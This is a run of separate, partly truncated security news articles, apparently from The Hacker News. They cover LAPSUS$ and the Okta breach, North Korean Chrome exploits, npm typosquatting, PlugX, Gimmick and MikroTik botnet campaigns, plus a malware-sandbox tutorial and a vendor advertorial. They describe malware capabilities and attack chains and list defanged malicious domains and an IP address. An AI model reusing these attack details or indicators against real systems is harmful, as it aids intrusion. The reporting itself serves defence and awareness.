enhanced back door functionality.“\nHeaderTip’s connections to Scarab come from malware and infrastructure overlaps to that of Scieron, with SentinelOne calling the latter a predecessor of the newly discovered backdoor. Designed as a 32-bit DLL file and written in C++, HeaderTip is 9.7 KB in size and its functionality is limited to acting as a first-stage package for fetching next-stage modules from a remote server.\n“Based on known targets since 2020, including those against Ukraine in March 2022, in addition to specific language use, we assess with moderate confidence that Scarab is Chinese speaking and operating under geopolitical intelligence collection purposes,“ Hegel said.\n\n\nFound this article interesting?

But in the absence of an extradition treaty between the U.S. and Russia, the chances that the four individuals will be brought to trial in the U.S. are slim.\nThe seven-year-long global energy sector campaign is said to have taken advantage of spear-phishing emails, trojanized software updates, and redirects to rogue websites (aka watering holes) to gain initial access, using it to deploy remote access trojans like Havex on compromised systems.\nThe energy sector attacks, which took place in two phases, involved deploying malware on an estimated 17,000 unique devices in the U.S. and abroad between 2012 and 2014, alongside targeting 3,300 users at more than 500 U.S. and international companies and entities from 2014 to 2017.\nAlso detailed by the security agencies is a 2017 campaign engineered by cyber actors with ties to TsNIIKhM with the goal of manipulating the industrial control systems of an unnamed oil refinery located in the Middle East by leveraging a piece of malware called TRITON.\n\n“TRITON was designed to specifically target Schneider Electric’s Triconex Tricon safety systems and is capable of disrupting those systems,“ the Cybersecurity and Infrastructure Security Agency (CISA), the Federal Bureau of Investigation (FBI), and the Department of Energy (DOE) said.\nCollectively, the hacking campaigns are alleged to have singled out thousands of computers, at hundreds of companies and organizations, in approximately 135 countries, the FBI said.\n“The potential of cyberattacks to disrupt, if not paralyze, the delivery of critical energy services to hospitals, homes, businesses and other locations essential to sustaining our communities is a reality in today’s world,“ said U.S. Attorney Duston Slinkard for the District of Kansas. “We must acknowledge there are individuals actively seeking to wreak havoc on our nation’s vital infrastructure system, and we must remain vigilant in our effort to thwart such attacks.“\n\n\nFound this article interesting?

Our enquiries remain ongoing.“\nThe development, which was first disclosed by BBC News, comes after a report from Bloomberg revealed that a 16-year-old Oxford-based teenager is the mastermind of the group. It’s not immediately clear if the minor is one among the arrested individuals. The said teen, under the online alias White or Breachbase, is alleged to have accumulated about $14 million in Bitcoin from hacking.\n\n“I had never heard about any of this until recently,“ the teen’s father was quoted as saying to the broadcaster. “He’s never talked about any hacking, but he is very good on computers and spends a lot of time on the computer. I always thought he was playing games.“\nAccording to security reporter Brian Krebs, the “ringleader“ purchased Doxbin last year, a portal for sharing personal information of targets, only to relinquish control of the website back to its former owner in January 2022, but not before leaking the entire Doxbin dataset to Telegram.\nThis prompted the Doxbin community to retaliate by releasing personal information on “WhiteDoxbin,“ including his home address and videos purportedly shot at night outside his home in the U.K.\nWhat’s more, the hacker crew has actively recruited insiders via social media platforms such as Reddit and Telegram since at least November 2021 before it surfaced on the scene in December 2021.\nAt least one member of the LAPSUS$ cartel is also believed to have been involved with a data breach at Electronic Arts last July, with Palo Alto Networks’ Unit 42 uncovering evidence of extortion activity aimed at U.K. mobile phone customers in August 2021.\n\nLAPSUS$, over a mere span of three months, have since accelerated their malicious activity, swiftly rising to prominence in the cyber crime world for its high-profile targets and maintaining an active presence on the messaging app Telegram, where it has amassed 47,000 subscribers.\nMicrosoft characterized the criminal syndicate as an “unorthodox“ group that “doesn’t seem to cover its tracks“ and that uses a unique blend of tradecraft, which couples phone-based social engineering and paying employees of target organizations for access to credentials.\nIf anything, LAPSUS$’ brazen approach to striking companies with little regard for operational security measures appears to have cost them dear, leaving behind a forensic trail that led to their arrests.\nThe last message from the group came on Wednesday when it announced that some of its members were taking a week-long vacation: “A few of our members has a vacation until 30/3/2022. We might be quiet for some times. Thanks for understand us - we will try to leak stuff ASAP.“\n\n\nFound this article interesting?

'text': 'Researchers have blown the lid off a sophisticated malicious scheme primarily targeting Chinese users via copycat apps on Android and iOS that mimic legitimate digital wallet services to siphon cryptocurrency funds.\n“These malicious apps were able to steal victims’ secret seed phrases by impersonating Coinbase, imToken, MetaMask, Trust Wallet, Bitpie, TokenPocket, or OneKey,“ said Lukáš Štefanko, senior malware researcher at ESET in a report shared with The Hacker News.\nThe wallet services are said to have been distributed through a network of over 40 counterfeit wallet websites that are promoted with the help of misleading articles posted on legitimate Chinese websites, as well as by means of recruiting intermediaries through Telegram and Facebook groups, in an attempt to trick unsuspecting visitors into downloading the malicious apps.\n\nESET, which has been tracking the campaign since May 2021, attributed it to the work of a single criminal group. The trojanized cryptocurrency wallet apps are crafted in such a manner that they replicate the same functionality of their original counterparts, while also incorporating malicious code changes that enable the theft of crypto assets.\n“These malicious apps also represent another threat to victims, as some of them send secret victim seed phrases to the attackers’ server using an unsecured HTTP connection,“ Štefanko said. “This means that victims’ funds could be stolen not only by the operator of this scheme, but also by a different attacker eavesdropping on the same network.“\n\nThe Slovak cybersecurity company said it found dozens of groups promoting malicious copies of these wallet apps on the Telegram messaging app that were in turn shared on at least 56 Facebook groups in hopes of landing new distribution partners for the fraudulent scheme.\n\n“Based on the information acquired from these groups, a person distributing this malware is offered a 50 percent commission on the stolen contents of the wallet,“ ESET noted.\nIn a unique twist, the apps, once installed, are configured differently depending on the operating system of the compromised mobile devices. On Android, the apps are aimed at cryptocurrency users who do not yet have any of the targeted wallet applications already installed, while on iOS, the victims can have both versions installed.\n\nIt’s also worth pointing out that fake wallet apps are not directly available on the iOS App Store. Rather they can only be downloaded by visiting one of the malicious websites using configuration profiles that make it possible to install applications that are not verified by Apple and from sources outside the App Store.\n\nThe investigation also unearthed 13 rogue apps that masqueraded as the Jaxx Liberty Wallet on the Google Play Store, all of which since been removed from the Android app marketplace as of January 2022. They were collectively installed more than 1,100 times.\n“Their goal was simply to tease out the user’s recovery seed phrase and send it either to the attackers’ server or to a secret Telegram chat group,“ Štefanko said.\nWith the threat actors behind the operation actively recruiting partners through social media and messaging apps and offering them a percentage of the stolen digital currency, ESET warns that the attacks could spill over to other parts of the world in the future.\n“Moreover, it seems that the source code of this threat has been leaked and shared on a few Chinese websites, which might attract various threat actors and spread this threat even further,“ Štefanko added.\n\n\nFound this article interesting?

{'title': 'North Korean Hackers Exploited Chrome Zero-Day to Target Fintech, IT, and Media Firms',
'text': 'Google’s Threat Analysis Group (TAG) on Thursday disclosed that it acted to mitigate threats from two distinct government-backed attacker groups based in North Korea that exploited a recently-uncovered remote code execution flaw in the Chrome web browser.\nThe campaigns, once again “reflective of the regime’s immediate concerns and priorities,“ are said to have targeted U.S. based organizations spanning news media, IT, cryptocurrency, and fintech industries, with one set of the activities sharing direct infrastructure overlaps with previous attacks aimed at security researchers last year.\nThe shortcoming in question is CVE-2022-0609, a use-after-free vulnerability in the browser’s Animation component that Google addressed as part of updates (version 98.0.4758.102) issued on February 14, 2022. It’s also the first zero-day flaw patched by the tech giant since the start of 2022.\n\n“The earliest evidence we have of this exploit kit being actively deployed is January 4, 2022,“ Google TAG researcher Adam Weidemann said in a report. “We suspect that these groups work for the same entity with a shared supply chain, hence the use of the same exploit kit, but each operate with a different mission set and deploy different techniques.“\nThe first campaign, consistent with TTPs associated with what Israeli cybersecurity firm ClearSky described as “Operation Dream Job“ in August 2020, was directed against over 250 individuals working for 10 different news media, domain registrars, web hosting providers, and software vendors, luring them with fake job offers from companies like Disney, Google, and Oracle.\nThe usage of phony job listings is a time-tested tactic of North Korean nation-state groups, which, earlier this January, was found impersonating the American global security and aerospace company Lockheed Martin to distribute malware payloads to target individuals seeking jobs in the aerospace and defense industry.\n“The double scenario of espionage and money theft is unique to North Korea, which operates intelligence units that steal both information and money for their country,“ ClearSky researchers noted at the time.\nThe second activity cluster that’s believed to have leveraged the same Chrome zero-day relates to Operation AppleJeus, which compromised at least two legitimate fintech company websites to serve the exploit to no less than 85 users.\nThe exploit kit, according to Google TAG, is fashioned as a multi-stage infection chain that involves embedding the attack code within hidden internet frames on both compromised websites as well as rogue websites under their control.\n“In other cases, we observed fake websites — already set up to distribute trojanized cryptocurrency applications — hosting iframes and pointing their visitors to the exploit kit,“ Weidemann said.\nThe initial stage encompassed a reconnaissance phase to fingerprint the targeted machines that was then followed by serving the remote code execution (RCE) exploit, which, when successful, led to the retrieval of a second-stage package engineered to escape the sandbox and carry out further post-exploitation activities.\n\nGoogle TAG, which discovered the intrusions on February 10, noted that it was “unable to recover any of the stages that followed the initial RCE,“ emphasizing that the threat actors made use of several safeguards, including the use of AES encryption, designed explicitly to obscure their tracks and hinder the recovery of intermediate stages.\nAdditionally, the campaigns checked for visitors using non-Chromium based browsers such as Safari on macOS or Mozilla Firefox (on any operating system), redirecting the victims to specific links on known exploitation servers. It’s not immediately clear if any of those attempts were fruitful.\nThe findings come as threat intelligence company Mandiant mapped different Lazarus sub-groups to various government organizations in North Korea, including the Reconnaissance General Bureau (RGB), the United Front Department (UFD), and the Ministry of State Security (MSS).\nLazarus is the umbrella moniker collectively referring to malicious cyber and financial crime operations originating from the heavily-sanctioned hermit kingdom, in the same manner Winnti and MuddyWater function as a conglomerate of multiple teams to help further China and Iran’s geopolitical and national security objectives.\n“North Korea’s intelligence apparatus possesses the flexibility and resilience to create cyber units based on the needs of the country,“ Mandiant researchers said. “Additionally overlaps in infrastructure, malware, and tactics, techniques and procedures indicate there are shared resources amongst their cyber operations.“\n\n\nFound this article interesting?

{'title': 'How to Build a Custom Malware Analysis Sandbox',
'text': 'Before hunting malware, every researcher needs to find a system where to analyze it. There are several ways to do it: build your own environment or use third-party solutions. Today we will walk through all the steps of creating a custom malware sandbox where you can perform a proper analysis without infecting your computer. And then compare it with a ready-made service.\nWhy do you need a malware sandbox? \nA sandbox allows detecting cyber threats and analyzing them safely. All information remains secure, and a suspicious file can’t access the system. You can monitor malware processes, identify their patterns and investigate behavior.\nBefore setting up a sandbox, you should have a clear goal of what you want to achieve through the lab. \nThere are two ways how to organize your working space for analysis:\nCustom sandbox. Made from scratch by an analyst on their own, specifically for their needs.A turnkey solution. A versatile service with a range of configurations to meet your demands. \nHow to build your own malware sandbox? \n\nHow to make your own malware sandbox\nLet’s walk through all steps that you need to set up the simple environment for malware research:1 — Install a virtual machine\nRunning malware should happen in a properly isolated environment to avoid infection of a host operating system. It’s better to have an isolated computer, but you can set up a virtual machine or rather a few of them with different versions of OSs. There are a bunch of VMs presented in the market: VMWare, VirtualBox, KVM, Oracle VM VirtualBox, Microsoft Hyper-V, Parallels, or Xen.2 — Check artifacts\nModern malware is smart – it understands whether it’s run on the virtual machine or not. That is why it’s essential to get rid of artifacts. Check code, remove detection, and others. 3 — Use a different network\nAnother precaution is to use a different network system. Preventing any infection of other computers on your network is important. Get a VPN service and set it up correctly. You can’t let the traffic leak happen from a real IP address. 4 — Assign a realistic amount of resources\nOur goal is to make a system look as authentic as possible to trick any malicious program into executing. Make sure that you assign a realistic amount of resources: more than 4 Gb of RAM, a minimum of 4 cores, and disk space of 100 Gb and more. That is a basic requirement to pretend as a legit system. And still, keep in mind that malware checks the configuration of equipment. If there is a virtual machine’s name somewhere, a malicious object identifies it and stops working. 5 — Install commonly used software\nIf you install Windows and leave it as is, a malicious object will get that it is analyzed. \nInstall a few applications, like Word, browsers, and other programs that all users usually have. 6 — Open several files\nHere we need to show that it is a real computer that belongs to someone. Open a few documents to accumulate logs and a few temp files. Several types of viruses check this. You can use Regshot or Process monitor to make logs of registry and file system changes. Note that these programs can be detected by malware when it is running. 7 — Imitate a network connection\nSome kinds of malware check if it can connect to websites like Google. How to trick a malicious program into thinking that it’s online? Utilities like INetSim and the FakeNet tool imitate a real Internet connection and allow us to intercept the requests that malware is making. Try to check network protocols between a malicious object and its host server. But beforehand, find out what the analyzed sample is connecting with using WireShark. And it takes some effort not to give up this tool to the malware, be careful.8 — Install analysis tools\nPrepare the tools you’ll use for analysis and ensure that you know how to use them. You can go with Flare VM tools or make use of these programs: \nDebuggers: x64dbg investigates malicious code by executing it.Disassemblers: Ghidra makes reverse engineering easier, with access to the decompiler’s output. It also can be used as a debugger. Traffic analyzers: Wireshark checks network communication that malware requests.File analyzers: Process Monitor, ProcDOT aim to monitor and understand how processes deal with files.Process monitors: Process Explorer, Process Hacker help to watch malware behavior. 9 — Update your system to the latest version\nYour system should be up-to-date as well as all software. Filter out the regular Windows changes that are happening quite often. However, your experiment may require a different version, such as how malware exploits some OS errors. In this scenario, choose and get the necessary version set up. 10 — Turn off Windows Defender and Windows firewall.\nDisable things like Windows defender. If you are working with malware, it can trip the antivirus. 11 — Get ready the files for analysis\nCreate a shared folder, select a directory you need. \nSet up a snapshot to roll back to the later state of the VM in case of an error. \nIf you complete all these steps, you’re good to go and start the analysis.\nIs there a more efficient option to analyze malware? \nAll these steps take a lot of time and preparation. And still, there is a chance that your sandbox will not be secure enough, invisible for malware, and provide the necessary information. So, what is a better solution? Here comes the second option – use a ready-made solution. Let’s take a look at ANY.RUN. \nANY.RUN is an online malware sandbox that you can use for detection, monitoring, and analyzing threats. The best part of it is time and convenience: \nIt takes only a few minutes to complete an analysis of a malicious sample.Most of the tools are ready for you, just choose what you need and start the task. Your files, system, and network are completely safe. The interface is simple enough even for junior analysts. \nIt’s still can be customizable – select an operating system, software set, localization, and other details for your purposes. But the perk is that you don’t need to install anything! Take your computer, and you are all set. \n\nTwo minutes is usually enough to crack even an advanced malware, and most modern anti-evasion tricks don’t work here. ANY.RUN hunts them all.\nEnjoy a faster solution\nThe best experience is your own, that is why we offer you to try the sandbox by yourself and check the features of ANY.RUN. And here is a special offer for our readers – you can try the service for free: \nWrite the “HACKERNEWS“ promo code in the email subject at support@any.run and get 14 days of ANY.RUN premium subscription for free! \nOf course, it’s up to you how to perform malware analysis. You can spend some time building your own virtual environment or perform analysis in several minutes using a convenient sandbox like ANY.RUN. The choice is yours. The most important thing is what you will do with these services and how to achieve your goals there. But that’s another story. Successful hunting!\n\n\nFound this article interesting?

{'title': 'Researchers Trace LAPSUS$ Cyber Attacks to 16-Year-Old Hacker from England',
'text': 'Authentication services provider Okta on Wednesday named Sitel as the third-party linked to a security incident experienced by the company in late January that allowed the LAPSUS$ extortion gang to remotely take over an internal account belonging to a customer support engineer.\nThe company added that 366 corporate customers, or about 2.5% of its customer base, may have been impacted by the “highly constrained“ compromise.\n“On January 20, 2022, the Okta Security team was alerted that a new factor was added to a Sitel customer support engineer’ Okta account [from a new location],“ Okta’s Chief Security Officer, David Bradbury, said in a statement. “This factor was a password.“\nThe disclosure comes after LAPSUS$ posted screenshots of Okta’s apps and systems earlier this week, about two months after the hackers gain access to the company’s internal network over a five-day period between January 16 and 21, 2022 using remote desktop protocol (RDP) until the MFA activity was detected and the account was suspended pending further probe.\n\nAlthough the company initially attempted to downplay the incident, the LAPSUS$ group called out the San Francisco-based company for what it alleged were lies, stating “I’m STILL unsure how it’s a [sic] unsuccessful attempt? Logged in to [sic] the SuperUser portal with the ability to reset the Password and MFA of ~95% of clients isn’t successful?“\nContrary to its name, SuperUser, Okta said, is used to perform basic management functions associated with its customer tenants and operates with the principle of least privilege (PoLP) in mind, granting support personnel access to only those resources that are pertinent to their roles.\nOkta, which has faced criticism for its delay in notifying customers about the incident, noted that it shared indicators of compromise with Sitel on January 21, which then engaged the services of an unnamed forensic firm that, in turn, went on to carry out the investigation and share its findings on March 10, 2022.\nAccording to a timeline of events shared by the company, “Okta received a summary report about the incident from Sitel“ last week on March 17, 2022.\n“I am greatly disappointed by the long period of time that transpired between our notification to Sitel and the issuance of the complete investigation report,“ Bradbury said. “Upon reflection, once we received the Sitel summary report we should have moved more swiftly to understand its implications.“\n“If you’re confused about Okta saying the ’service has not been breached,’ remember that the statement is purely a legal word soup,“ security researcher Runa Sandvik said on Twitter. “Fact is that a third-party was breached; that breach affected Okta; failure to disclose it affected Okta’s customers.“\nA 16-year-old behind LAPSUS$?\nThe security breaches of Okta and Microsoft are the latest in a rampage of infiltrations staged by the LAPSUS$ group, which has also hit high-profile victims like Impresa, NVIDIA, Samsung, Vodafone, and Ubisoft. It’s also known for publicizing its conquests on an active Telegram channel that has over 46,200 members.\nCybersecurity firm Check Point described LAPSUS$ as a “Portuguese hacking group from Brazil,“ with Microsoft calling out its “unique blend of tradecraft“ that involves targeting its victims with SIM swapping, unpatched server flaws, dark web reconnaissance, and phone-based phishing tactics.\n\n“The real motivation of the group is still unclear however, even if it claims to be purely financially motivated,“ the Israeli company said. “LAPSUS$ has a strong engagement with their followers, and even posts interactive polls on who their next unfortunate target should be.“\nBut in an interesting twist, Bloomberg reported that “a 16-year-old living at his mother’s house near Oxford, England“ might be the brains behind the operation, citing four researchers investigating the group. Another member of LAPSUS$ is suspected to be a teenager living in Brazil.\nWhat’s more, the alleged teen hacker, who goes by the online alias “White“ and “breachbase,“ may also have had a role in the intrusion at game maker Electronic Arts (EA) last July, going by cybersecurity expert Brian Krebs’ latest report detailing the activities of a core LAPSUS$ member nicknamed “Oklaqq“ aka “WhiteDoxbin.“\n“Back in May 2021, WhiteDoxbin’s Telegram ID was used to create an account on a Telegram-based service for launching distributed denial-of-service (DDoS) attacks, where they introduced themself as ’@breachbase,’“ Krebs noted. “News of EA’s hack last year was first posted to the cybercriminal underground by the user ’Breachbase’ on the English-language hacker community RaidForums, which was recently seized by the FBI.“\n\n\nFound this article interesting?

'text': 'A new large scale supply chain attack has been observed targeting Azure developers with no less than 218 malicious NPM packages with the goal of stealing personal identifiable information.\n“After manually inspecting some of these packages, it became apparent that this was a targeted attack against the entire @azure NPM scope, by an attacker that employed an automatic script to create accounts and upload malicious packages that cover the entirety of that scope,“ JFrog researchers Andrey Polkovnychenko and Shachar Menashe said in a new report.\nThe entire set of malicious packages was disclosed to the NPM maintainers roughly two days after they were published earlier this week, leading to their quick removal, but not before each of the packages were downloaded around 50 times on average.\n\nThe attack refers to what’s called typosquatting, which takes place when bad actors push rogue packages with names mimicking legitimate libraries to a public software registry such as NPM or PyPI with the hope of tricking users into installing them.\nIn this specific case observed by the DevSecOps firm, the unknown adversary is said to have created dozens of malicious counterparts with the same name as their existing @azure scope packages but without the scope name (e.g., @azure/core-tracing vs. core-tracing).\n“The attacker is relying on the fact that some developers may erroneously omit the @azure prefix when installing a package,“ the researchers said. “For example, running npm install core-tracing by mistake, instead of the correct command – npm install @azure/core-tracing.“\nNot only did the attack leverage a unique username to upload every single package to the repository to avoid raising suspicion, the malware-laced libraries also featured high version numbers (e.g., 99.10.9), indicating an attempt to carry out a dependency confusion attack.\n\nShould a developer unwittingly install one of these packages, it leads to the execution of a reconnaissance payload that’s designed to list directories as well as gather information about the user’s current working directory and IP addresses related to network interfaces and DNS servers, all of which is exfiltrated to a hardcoded remote server.\n“Due to the meteoric rise of supply chain attacks, especially through the NPM and PyPI package repositories, it seems that more scrutiny and mitigations should be added,“ the researchers said.\n“For example, adding a CAPTCHA mechanism on NPM user creation would not allow attackers to easily create an arbitrary amount of users from which malicious packages could be uploaded, making attack identification easier.“\n\n\nFound this article interesting?

'text': 'A China-based advanced persistent threat (APT) known as Mustang Panda has been linked to an ongoing cyber espionage campaign using a previously undocumented variant of the PlugX remote access trojan on infected machines.\nSlovak cybersecurity firm ESET dubbed the new version Hodur, owing to its resemblance to another PlugX (aka Korplug) variant called THOR that came to light in July 2021.\n“Most victims are located in East and Southeast Asia, but a few are in Europe (Greece, Cyprus, Russia) and Africa (South Africa, South Sudan),“ ESET malware researcher Alexandre Côté Cyr said in a report shared with The Hacker News.\n\n“Known victims include research entities, internet service providers (ISPs), and European diplomatic missions mostly located in East and Southeast Asia.“\nMustang Panda, also known as TA416, HoneyMyte, RedDelta, or PKPLUG, is a cyber espionage group that’s primarily known for targeting non-governmental organizations with a specific focus on Mongolia.\nThe latest campaign, which dates back to at least August 2021, makes use of a compromise chain featuring an ever-evolving stack of decoy documents pertaining to the ongoing events in Europe and the war in Ukraine.\n\n“Other phishing lures mention updated COVID-19 travel restrictions, an approved regional aid map for Greece, and a Regulation of the European Parliament and of the Council,“ ESET said. “The final lure is a real document available on the European Council’s website. This shows that the APT group behind this campaign is following current affairs and is able to successfully and swiftly react to them.“\nRegardless of the phishing lure employed, the infections culminate in the deployment of the Hodur backdoor on the compromised Windows host.\n\n“The variant used in this campaign bears many similarities to the THOR variant, which is why we have named it Hodur,“ Côté Cyr explained. “The similarities include the use of the Software\CLASSES\ms-pu registry key, the same format for [command-and-control] servers in the configuration, and use of the Static window class.“\nHodur, for its part, is equipped to handle a variety of commands, enabling the implant to gather extensive system information, read and write arbitrary files, execute commands, and launch a remote cmd.exe session.\nThe findings from ESET line up with public disclosures from Google’s Threat Analysis Group (TAG) and Proofpoint, both of which detailed a Mustang Panda campaign to distribute an updated PlugX variant earlier this month.\n“The decoys used in this campaign show once more how quickly Mustang Panda is able to react to world events,“ Côté Cyr said. “This group also demonstrates an ability to iteratively improve its tools, including its signature use of trident downloaders to deploy Korplug.“\n\n\nFound this article interesting?

'text': 'Researchers have disclosed details of a newly discovered macOS variant of a malware implant developed by a Chinese espionage threat actor known to strike attack organizations across Asia.\nAttributing the attacks to a group tracked as Storm Cloud, cybersecurity firm Volexity characterized the new malware, dubbed Gimmick, as a “feature-rich, multi-platform malware family that uses public cloud hosting services (such as Google Drive) for command-and-control (C2) channels.“\nThe cybersecurity firm said it recovered the sample through memory analysis of a compromised MacBook Pro running macOS 11.6 (Big Sur) as part of an intrusion campaign that took place in late 2021.\n\n“Storm Cloud is an advanced and versatile threat actor, adapting its tool set to match different operating systems used by its targets,“ Volexity researchers Damien Cash, Steven Adair, and Thomas Lancaster said in a report.\n“They make use of built-in operating system utilities, open-source tools, and custom malware implants to achieve their objectives. Leveraging cloud platforms for C2, such as using Google Drive, increases the likelihood of operating undetected by network monitoring solutions.“\n\nUnlike its Windows counterpart, which is coded in both .NET and Delphi, the macOS version is written in Objective C. The choice of the programming languages aside, the two versions of the malware are known to share the same C2 infrastructure and behavioral patterns.\nOnce deployed, Gimmick is launched either as a daemon or in the form of a customized application that’s engineered to impersonate a program frequently launched by the targeted user. The malware is configured to communicate with its Google Drive-based C2 server only on working days in order to further blend in with the network traffic in the target environment.\n\nWhat’s more, the backdoor, besides retrieving arbitrary files and executing commands from the C2 server, comes with its own uninstall functionality that allows it to erase itself from the compromised machine.\nTo protect users against the malware, Apple has issued new signatures to its built-in anti-malware protection suite known as XProtect as of March 17, 2022 to block and remove the infections via its Malware Removal Tool (MRT).\n“The work involved in porting this malware and adapting its systems to a new operating system (macOS) is no light undertaking and suggests the threat actor behind it is well resourced, adept, and versatile,“ the researchers said.\n\n\nFound this article interesting?

'text': 'A new class of security tools is emerging that promises to significantly improve the effectiveness and efficiency of threat detection and response.\n\nEmerging Extended Detection and Response (XDR) solutions aim to aggregate and correlate telemetry from multiple detection controls and then synthesize response actions.\n\nXDR has been referred to as the next step in the evolution of Endpoint Detection and Response (EDR) solutions.\n\nBecause XDR represents a new solution category, there is no single accepted definition of what capabilities and features should (and shouldn’t) be included.\n\nEach provider approaches XDR with different strengths and perspectives on how what an XDR solution should include.\n\nTherefore, selecting an XDR provider is quite challenging as organizations must organize and prioritize a wide range of capabilities that can differ significantly between providers.\n\nCynet is now addressing this need with the Definitive RFP Template for XDR solutions (download here), an expert-made security requirement list that enables stakeholders to accelerate and optimize the evaluation process of the products they evaluate.\n\nThe RFP template aims to capture the widest common denominator in terms of security needs and deliver the essentials relevant to any organization.\n\nAn XDR solution can benefit large companies that are awash in alerts from multiple detection sources, rationalize the myriad signals, and simplify response actions.  Smaller companies benefit by leveraging a single platform that would otherwise require coordinating several expensive and complex point solutions.  Logically it makes sense for organizations to achieve greater threat visibility along with reduced complexity.\n\n“Despite all the security tools that have been deployed over the years to prevent and detect breaches, attackers are still able to find the seams in the protections,“ says Eyal Gruner, CEO of Cynet. “One of the main problems is that security teams simply cannot make sense of the barrage of information and alerts coming at them from multiple security tools.  And, some organizations can’t afford to deploy all of the necessary monitoring tools to ensure full protection.“\n\nTo provide strong breach protection, organizations must collect, synthesize, and make sense of signals from the primary attack vectors as the first step to better defense.  Then, automating investigation and remediation to cover the full breadth of each attack ensures all appropriate actions are taken to protect the organization.  This is where XDR comes in.\n\nUsing the ready-made templates can potentially save significant time and resources otherwise spent on building a similar requirement list from scratch.  The XDR solution RFP can help companies prioritize the capabilities available in emerging solutions to improve their purchase decisions.\n\nThe RFP comprises five sections:\n\nMonitoring & Control—routine activities to gain visibility and proactively discover and reduce attack surfaces.Prevention & Detection—mechanism to thwart the wide array of commodities and advanced attack vectors.Investigation & response—an overall toolset for efficient reaction to the detected live attacks.Infrastructure—architecture, deployment, data collection, and communication.Operation—ongoing management of the solution\n\nThe RFP Guides ensure organizations are not overlooking important aspects of security solution capabilities and thereby making substandard decisions for critical enterprise purchases.\n\nDownload the XDR RFP here.\n\n\nFound this article interesting?

{'title': 'Botnet of Thousands of MikroTik Routers Abused in Glupteba, TrickBot Campaigns',
'text': 'Vulnerable routers from MikroTik have been misused to form what cybersecurity researchers have called one of the largest botnet-as-a-service cybercrime operations seen in recent years. \nAccording to a new piece of research published by Avast, a cryptocurrency mining campaign leveraging the new-disrupted Glupteba botnet as well as the infamous TrickBot malware were all distributed using the same command-and-control (C2) server.\n“The C2 server serves as a botnet-as-a-service controlling nearly 230,000 vulnerable MikroTik routers,“ Avast’s senior malware researcher, Martin Hron, said in a write-up, potentially linking it to what’s now called the Mēris botnet.\n\nThe botnet is known to exploit a known vulnerability in the Winbox component of MikroTik routers (CVE-2018-14847), enabling the attackers to gain unauthenticated, remote administrative access to any affected device. Parts of the Mēris botnet were sinkholed in late September 2021.\n“The CVE-2018-14847 vulnerability, which was publicized in 2018, and for which MikroTik issued a fix for, allowed the cybercriminals behind this botnet to enslave all of these routers, and to presumably rent them out as a service,“ Hron said.\nIn attack chain observed by Avast in July 2021, vulnerable MikroTik routers were targeted to retrieve the first-stage payload from a domain named bestony[.]club, which was then used to fetch additional scripts from a second domain “globalmoby[.]xyz.“\nInteresting enough, both the domains were linked to the same IP address: 116.202.93[.]14, leading to the discovery of seven more domains that were actively used in attacks, one of which (tik.anyget[.]ru) was used to serve Glupteba malware samples to targeted hosts.\n“When requesting the URL https://tik.anyget[.]ru I was redirected to the https://routers.rip/site/login domain (which is again hidden by the Cloudflare proxy),“ Hron said. “This is a control panel for the orchestration of enslaved MikroTik routers,“ with the page displaying a live counter of devices connected into the botnet.\nBut after details of the Mēris botnet entered public domain in early September 2021, the C2 server is said to have abruptly stopped serving scripts before disappearing completely.\n\nThe disclosure also coincides with a new report from Microsoft, which revealed how the TrickBot malware has weaponized MikroTik routers as proxies for command-and-control communications with the remote servers, raising the possibility that the operators may have used the same botnet-as-a-service.\nIn light of these attacks, it’s recommended that users update their routers with the latest security patches, set up a strong router password, and disable the router’s administration interface from the public side.\n“It also shows, what is quite obvious for some time already, that IoT devices are being heavily targeted not just to run malware on them, which is hard to write and spread massively considering all the different architectures and OS versions, but to simply use their legal and built-in capabilities to set them up as proxies,“ Hron said. “This is done to either anonymize the attacker’s traces or to serve as a DDoS amplification tool.“\nUpdate: Latvian company MikroTik told The Hacker News that the number “was only true before we released the patch in [the] year 2018. After patch was released, the actual affected number of devices is closer to 20,000 units that still run the older software. Also, not all of them are actually controlled by the botnet, many of them have a strict firewall in place, even though running older software.“\nWhen reached out to Avast for comment, the cybersecurity company confirmed that the number of affected devices (~230,000) reflected the status of the botnet prior to its disruption. “However, there are still isolated routers with compromised credentials or staying unpatched on the internet,“ the company said in a statement.\n(The headline of the article has been corrected to take into account the fact that the number of affected MikroTik routers is no longer more than 200,000 as previously stated.)\n\n\nFound this article interesting?

{'title': 'Microsoft and Okta Confirm Breach by LAPSUS$ Extortion Group',
'text': 'Microsoft on Tuesday confirmed that the LAPSUS$ extortion-focused hacking crew had gained “limited access“ to its systems, as authentication services provider Okta revealed that nearly 2.5% of its customers have been potentially impacted in the wake of the breach.\n“No customer code or data was involved in the observed activities,“ Microsoft’s Threat Intelligence Center (MSTIC) said, adding that the breach was facilitated by means of a single compromised account that has since been remediated to prevent further malicious activity.\nThe Windows maker, which was already tracking the group under the moniker DEV-0537 prior to the public disclosure, said it “does not rely on the secrecy of code as a security measure and viewing source code does not lead to elevation of risk.“\n“This public disclosure escalated our action allowing our team to intervene and interrupt the actor mid-operation, limiting broader impact,“ the company’s security teams noted.\nIdentity and access management company Okta, which also acknowledged the breach through the account of a customer support engineer working for a third-party provider, said that the attackers had access to the engineer’s laptop during a five-day window between January 16 and 21, but that the service itself was not compromised.\n\nThe San Francisco-based cloud software firm also said it’s identified the affected customers and that it’s contacting them directly, stressing that the “Okta service is fully operational, and there are no corrective actions our customers need to take.“\n“In the case of the Okta compromise, it would not suffice to just change a user’s password,“ web infrastructure company Cloudflare said in a post mortem analysis of the incident. “The attacker would also need to change the hardware (FIDO) token configured for the same user. As a result, it would be easy to spot compromised accounts based on the associated hardware keys.“\nThat said, of particular concern is the fact that Okta failed to publicly disclose the breach for two months, prompting the cyber criminal group to ask “Why wait this long?“ in its counter statement.\nLAPSUS$ has also claimed in its rebuttal that Okta was storing Amazon Web Services (AWS) keys within Slack and that support engineers seem to have “excessive access“ to the communications platform. “The potential impact to Okta customers is NOT limited, I’m pretty certain resetting passwords and MFA would result in complete compromise of many clients’ systems,“ the gang elaborated.\nMicrosoft Exposes the Tactics of LAPSUS$\nLAPSUS$, which first emerged in July 2021, has been on a hacking spree in recent months, targeting a wealth of companies over the intervening period, including Impresa, Brazil’s Ministry of Health, Claro, Embratel, NVIDIA, Samsung, Mercado Libre, Vodafone, and most recently Ubisoft.\nThe financially motivated group’s modus operandi has been relatively straightforward: break into a target’s network, steal sensitive data, and blackmail the victim company into paying up by publicizing snippets of the stolen data on their Telegram channel.\n\nMicrosoft described LAPSUS$ as a group following a “pure extortion and destruction model without deploying ransomware payloads“ and one that “doesn’t seem to cover its tracks.“\nOther tactics adopted by the crew include phone-based social engineering schemes such as SIM-swapping to facilitate account takeover, accessing personal email accounts of employees at 